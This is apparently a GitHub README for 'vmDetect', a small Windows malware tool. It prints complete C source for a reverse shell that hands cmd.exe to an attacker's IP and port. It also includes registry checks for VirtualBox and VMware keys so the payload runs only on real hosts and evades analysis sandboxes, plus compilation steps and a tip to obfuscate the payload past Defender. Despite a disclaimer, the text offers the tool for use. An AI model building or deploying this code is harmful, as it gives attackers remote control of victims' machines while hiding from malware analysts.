# Introduction
`vmDetect` is a tool designed to run malicious code (in this case, a reverse shell) on the target, with the catch that it only runs on real computers (Windows hosts). This is only a demonstration on how cyber criminals can difficult the malware analysis, and as a disclaimer, I'm not resposible of the bad use you can give to this tool.
Also, this is an enhanced version of [the original tool](https://github.com/screeck/YouTube/blob/main/Detect_VM/main.c), kudos to [screeck](https://github.com/screeck) :P
# Code analysis
## Functions
`main.c` contains four functions:
1. `reverse_shell()`: this function sends an interactive command prompt `cmd.exe` to the attacker using a [standard windows reverse shell in C](https://github.com/izenynn/c-reverse-shell/blob/main/windows.c):
```c
void reverse_shell() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockt == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);

    struct in_addr addr;
    if (inet_pton(AF_INET, CLIENT_IP, &addr) != 1) {
        closesocket(sockt);
        WSACleanup();
        return;
    }
    sa.sin_addr = addr;

    if (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;
    PROCESS_INFORMATION pinfo;
    if (!CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(sockt);
    WSACleanup();
}
```
2. `execute`: this function simply calls to the above one (if the conditions are OK, we'll see that later on).
```c
void execute() {
    reverse_shell();
}
```
3. `dont_execute`: as you can tell by its name, it does literally nothing. This is the code I gave to it.
```c
void dont_execute() {
    // do shit
}
```
4. `check_registry_key`: now last but not least, this function is in charge of checking if any of the later on provided registry keys exist.
```c
int check_registry_key(const char* keyPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; 
    }
    return 0; 
}
```
Additionally, there is the `main` function, which orchestrates the overall behavior of the program by checking registry keys and calling the appropriate functions based on their existence.
```c
int main() {
    const char* keyPath1 = "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest";
    const char* keyPath2 = "SYSTEM\\CurrentControlSet\\Services\\vmhgfs";

    if (check_registry_key(keyPath1) || check_registry_key(keyPath2)) {
        dont_execute();
    }
    else {
        execute();
    }
    return 0;
}
```
## How it works
What this code basically does is to firstly, check if any of these registry keys exist:
```
SYSTEM\\CurrentControlSet\\Services\\VBoxGuest
SYSTEM\\CurrentControlSet\\Services\\vmhgfs
```
If any of these does, then it means the target is on a VM (virtual machine), so the malware will proceed to execute the function `dont_execute`, thus, doing nothing.
However, if you're running it from a Windows host, it won't find any of these two keys, so it will proceed to run the `execute` function, meaning it will then run your reverse shell. 
> Note: this C code ain't obfuscated, so if you want to bypass defender, you'll have to craft your own payload. I won't share my obfuscated payloads to the whole internet for obvious reasons.
# Demonstration
For this demonstration I'm using 3 VMs and 1 host (my Windows host);
- 1 kali VM (VMware) -- (bridged and NAT network)
- 1 Windows 11 VM (VMware) -- (NAT network)
- 1 Windows 10 VM (VBox) -- (bridged network)

As you can see on the following  video, the tool fails on VMware:

https://github.com/user-attachments/assets/c59f9c7d-bb6b-4838-a083-868feb7f0580

And it fails as well on Virtual Box:

https://github.com/user-attachments/assets/38034e3e-d1c5-4a64-b05f-01f9b06224f0

But, if I run it from my host, I get a shell on my Kali box:

![image](https://github.com/user-attachments/assets/b2e40e83-2833-42a7-8d42-cb75cc5a97f3)

> Note: Obviously, the CMD window will hang until you exit the shell.

# Compilation
Simply, on Visual Studio, clone the repo and hit `CTRL` + `SHIFT` + `B`. If you're on linux, run:

```bash
ruycr4ft@hacky:~$ x86_64-w64-mingw32-gcc -o main.exe main.c
```
After that, you're ready to go! Have fun and use it well.
